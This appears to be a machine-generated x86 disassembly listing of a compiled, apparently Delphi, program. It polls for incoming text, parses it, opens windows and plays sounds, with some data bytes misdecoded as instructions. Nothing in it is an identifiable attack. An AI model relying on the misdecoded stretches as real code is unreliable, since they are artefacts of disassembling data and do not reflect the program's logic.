add [ eax + edx * 4 + 0x531303af ] al
push ebx
xor [ ebx + 0x6c ] eax
imul esp [ ebp + 0x6e ] 0x73694474
arpl [ edi + 0x6e ] bp
outsb
arpl [ gs : edx + edx ] si
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3af6a46
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a7d3b8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_3a62ee0
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_3a7cdc8
lea eax [ ebp - 0x1c ]
push eax
push 0x0
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_3ae568c
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax ebx
call sub_3a7d3a0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3a7d3b8
mov [ ebp - 0x1 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a64380
mov eax [ ebp - 0xc ]
call sub_3a64380
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_3a62efc
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_3a62efc
retn
add [ edx - 0x7b0f5eff ] dh
cmpsd [ esi ] [ edi ]
add ebp eax
retn 0xf6d9
xor [ eax + eax ] ecx
add al 0xaa
jne r-xdata
mov gs [ edi + 0x53530e03 ]
push cs
add [ ecx ] bl
add [ eax + ecx * 4 + 0x461203af ] dh
arpl [ gs : eax + 0x61 ] bp
jb r-xdata
add [ eax - 0x6d ] dl
add ah bl
xchg edx eax
scasd [ edi ]
add edx [ edx ]
inc ebp
call 0xffffffffec97af51
push ss
xor [ eax + 0x6c03af65 ] edx
inc esi
outsd
jb r-xdata
push es
push esp
jbe r-xdata
add [ eax - 0x70 ] dh
add al cl
clc
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ edx + edx ] si
outsd
outsb
js r-xdata
popad
je r-xdata
xchg ebp eax
outsd
inc ebp
outsb
arpl [ ecx + 0x70 ] bp
popad
insb
add [ eax ] al
mov eax eax
test eax 0xa9441c03
add eax [ ebp - 0x57 ]
add edi [ eax + 0x3b6003ad ]
lodsd [ esi ]
add eax [ edi - 0x56 ]
add [ edx + ebp * 4 ] al
jae r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x69543172
insd
jb r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0x8cdc0013
scasd [ edi ]
add ecx [ edx + eax * 2 ]
jne r-xdata
add eax [ eax + 0x1f ]
stosb [ edi ]
add edi [ eax + 0x6403ae24 ]
cmpsd [ esi ] [ edi ]
inc esp
daa
stosb [ edi ]
inc ebx
insb
jne r-xdata
imul esp [ ebx + 0x6b ] 0x93b00022
scasd [ edi ]
add ebx [ ebx ]
inc edi
jb r-xdata
outsb
xor eax [ ebx + 0x6c ]
cmp ebp [ ebp - 0x55d8bbfd ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
inc ebp
jbe r-xdata
sbb eax 0xaf8b5400
scasd [ edi ]
add ecx [ edx + eax * 2 ]
jne r-xdata
xor al [ ebx + 0x6c ]
imul esp [ ebx + 0x6b ] 0x93500013
je r-xdata
scasd [ edi ]
add ebx [ ebx ]
inc ecx
jo r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x95800022
outsb
js r-xdata
push 0x6f437261
je r-xdata
je r-xdata
outsb
je r-xdata
sub ebp [ ebx + eax + 0x50090068 ]
jb r-xdata
jb r-xdata
push es
push esp
inc esi
outsd
jb r-xdata
add eax [ edi ]
add edx [ esi ]
inc edx
popad
imul edi [ eax + 0x61 ] 0x78456572
arpl [ gs : ebp + 0x6c ] si
xor [ ebx + 0x6c ] eax
inc esi
arpl [ gs : eax + 0x61 ] bp
jb r-xdata
xor [ ebx + 0x6c ] eax
imul esp [ ebp + 0x6e ] 0x72724574
outsd
jb r-xdata
outsb
xor [ ebx + 0x6c ] eax
imul esp [ ebx + 0x6b ] 0x8e4c0015
scasd [ edi ]
add ecx [ esi ]
push ebx
push ebx
test eax 0xa9201003
add ebx [ eax ]
sub [ ecx - 0x51454ffd ] ebp
add edx [ eax + r-xdata ]
pop es
xor [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
cmpsd [ fs : esi ] [ edi ]
imul esp [ ebx + 0x6b ] 0x8b54001d
scasd [ edi ]
outsd
outsb
adc al [ eax ]
test [ ebp + 0x430b03af ] dl
push 0x316f7461
inc ebx
insb
sub_3af696c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
test ebx ebx
je r-xdata
movzx eax [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3af6a46
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_3a7d3b8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_3a62ee0
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_3a7cdc8
lea eax [ ebp - 0x1c ]
push eax
push 0x0
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_3ae568c
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax ebx
call sub_3a7d3a0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_3a7d3b8
mov [ ebp - 0x1 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a64380
mov eax [ ebp - 0xc ]
call sub_3a64380
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_3a62efc
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_3a62efc
retn
sub_3af6a58
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_3a830d4
mov [ edi + 0x40 ] esi
mov [ edi + 0xf ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3af6a9c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_3a830d4
mov [ edi + 0x40 ] esi
mov [ edi + 0xf ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3af6ae0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_3a830d4
mov [ edi + 0x40 ] esi
mov [ edi + 0xf ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3af6b24
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_3a830d4
mov [ edi + 0x40 ] esi
mov [ edi + 0xf ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3af6b68
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
mov eax [ ebp - 0x8 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3af6c77
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0xc ] eax
mov [ ebp - 0xe ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a6587c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af6c7e
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea ecx [ ebp - 0x1c ]
movzx edx [ ebp - 0xe ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
mov ebx [ ebp - 0x14 ]
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea ecx [ esi + ebx ]
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
inc [ ebp - 0xe ]
sub_3af6c88
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3af7198
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
cmp [ ebx + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af719f
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
mov eax [ ebx + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x40 ]
call sub_3ae3ae0
test eax eax
jle r-xdata
push 0xa
call Sleep
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x40 ]
call sub_3ae3aec
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov ecx [ ebx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3af6a9c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_3a83590
mov edx r-xdata
mov eax [ ebx + 0x40 ]
call sub_3ae35c4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov ecx [ ebx + 0x40 ]
mov edx 0x1
mov esi [ eax ]
call [ esi + 0x24 ]
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a830d4
mov esi eax
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov [ eax + 0x38c ] esi
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x38c ]
mov edx [ ebx + 0x40 ]
mov [ eax + 0x40 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
call sub_3adeb50
mov eax [ eax + 0x8 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x38c ]
call sub_3a83590
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xb
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
push 0x0
push 0x1
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
mov ecx [ ebp - 0x8 ]
xor edx edx
call sub_3adeaa4
mov esi eax
test esi esi
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xb
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov ecx [ ebx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3af6ae0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax 0x44
mov edx [ ebp - 0x8 ]
call sub_3a652f4
mov eax [ ebp - 0x10 ]
call sub_3a83590
push 0x3e8
call Sleep
mov edx r-xdata
mov eax [ ebx + 0x40 ]
call sub_3ae35c4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx 0x2
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edx [ ebx + 0x40 ]
mov [ eax + 0x388 ] edx
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0xb
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov ecx [ ebx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3af6b24
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x44
mov edx [ ebp - 0x8 ]
call sub_3a652f4
mov eax [ ebp - 0x14 ]
call sub_3a83590
push 0x3e8
call Sleep
mov edx r-xdata
mov eax [ ebx + 0x40 ]
call sub_3ae35c4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x9
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
push 0x0
push 0x1
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
mov ecx [ ebp - 0x8 ]
xor edx edx
call sub_3adeaa4
mov esi eax
test esi esi
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx 0x4
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x3f0 ]
mov edx [ eax ]
call [ edx ]
push eax
mov edx 0x4
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x37c ]
pop edx
call sub_3ad969c
push r-xdata
mov edx 0x4
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x3f0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
lea eax [ ebp - 0x1c ]
call sub_3a69958
push [ ebp - 0x1c ]
push r-xdata
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x18 ]
mov eax [ ebx + 0x40 ]
call sub_3ae35c4
mov edx 0x4
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edx [ eax + 0x3f0 ]
mov eax [ ebx + 0x40 ]
call sub_3ae37ac
mov edx 0x4
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x384 ]
mov dl 0x1
call sub_3a9c298
sub_3af726c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a65720
xor eax eax
push ebp
push sub_3af7360
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af7367
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
inc ebx
mov edx ebx
add edx edx
add edx edx
mov eax esi
xor ecx ecx
call sub_3a63a44
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_3a657d8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + eax - 0x1 ] 0x7c
je r-xdata
sub eax 0x4
mov eax [ eax ]
xor ebx ebx
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_3a6556c
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jg r-xdata
movzx eax bx
lea eax [ esi + eax * 4 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_3a65798
inc ebx
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_3a657d8
cmp bx 0x64
jae r-xdata
sub_3af736f
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] bh
add [ ebp - 0x75 ] dl
in al dx
mov ecx 0x43
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1b0 ] eax
mov ecx 0x65
lea eax [ ebp - 0x1ac ]
mov edx [ r-xdata ]
call sub_3a65d4c
xor eax eax
push ebp
push sub_3af819b
push [ fs : eax ]
mov [ fs : eax ] esp
push r-xdata
mov eax [ ebp - 0x1b0 ]
mov esi [ eax + 0x40 ]
mov eax esi
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x1d0 ]
call sub_3a69958
push [ ebp - 0x1d0 ]
push r-xdata
lea eax [ ebp - 0x1cc ]
mov edx 0x3
call sub_3a65634
mov edx [ ebp - 0x1cc ]
mov eax esi
call sub_3ae35c4
jmp r-xdata
mov eax [ ebp - 0x1b0 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3af81a2
lea eax [ ebp - 0x21c ]
call sub_3a652a0
lea eax [ ebp - 0x218 ]
mov edx 0x3
call sub_3a652c4
lea eax [ ebp - 0x20c ]
call sub_3a652a0
lea eax [ ebp - 0x208 ]
mov edx 0xd
call sub_3a652c4
lea eax [ ebp - 0x1d4 ]
call sub_3a652a0
lea eax [ ebp - 0x1d0 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x1ac ]
mov ecx 0x65
mov edx [ r-xdata ]
call sub_3a65e38
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_3a652c4
retn
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae3ae0
test eax eax
jle r-xdata
push 0xa
call Sleep
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae3aec
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x7
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x2
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
lea edx [ ebp - 0x1d4 ]
mov eax [ rw-data ]
mov eax [ eax + 0x39c ]
call sub_3aafb88
mov edx [ ebp - 0x1d4 ]
mov eax [ ebp - 0x18 ]
call sub_3a656c8
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x7
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
push 0x0
push 0x1
push 0x0
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x1e8 ]
call sub_3a69958
mov ecx [ ebp - 0x1e8 ]
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
xor edx edx
call sub_3adeaa4
mov ebx eax
mov edx 0x5
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x1b8 ] eax
call GetTickCount
sub eax [ ebp - 0x1b8 ]
mov [ ebp - 0x1bc ] eax
lea edx [ ebp - 0x1ec ]
mov eax [ ebp - 0x1bc ]
call sub_3a6986c
mov ecx [ ebp - 0x1ec ]
mov edx 0x4
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x5
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
mov edx r-xdata
call sub_3ae35c4
mov eax [ rw-data ]
mov eax [ eax + 0x370 ]
mov eax [ eax + 0x278 ]
call sub_3adab2c
mov ebx eax
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae3058
xor edx edx
push edx
push eax
lea eax [ ebp - 0x1d8 ]
call sub_3a69958
mov edx [ ebp - 0x1d8 ]
mov eax ebx
call sub_3ada5a8
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
lea edx [ ebp - 0x1dc ]
mov eax [ ebp - 0x1b0 ]
mov eax [ eax + 0x40 ]
call sub_3ae3074
mov edx [ ebp - 0x1dc ]
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x1b0 ]
mov ecx [ eax + 0x40 ]
xor edx edx
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
call [ esi + 0x24 ]
push 0x1
lea edx [ ebp - 0x1e4 ]
xor eax eax
call sub_3a63350
mov eax [ ebp - 0x1e4 ]
lea edx [ ebp - 0x1e0 ]
call sub_3a69fb0
lea eax [ ebp - 0x1e0 ]
mov edx r-xdata
call sub_3a6556c
mov eax [ ebp - 0x1e0 ]
call sub_3a65730
push eax
call sndPlaySoundA
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_3a6587c
test eax eax
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_3a65338
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
add ecx 0x7
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_3a657d8
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_3a6587c
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_3a65798
mov edx 0x6
mov eax [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x360 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx 0x6
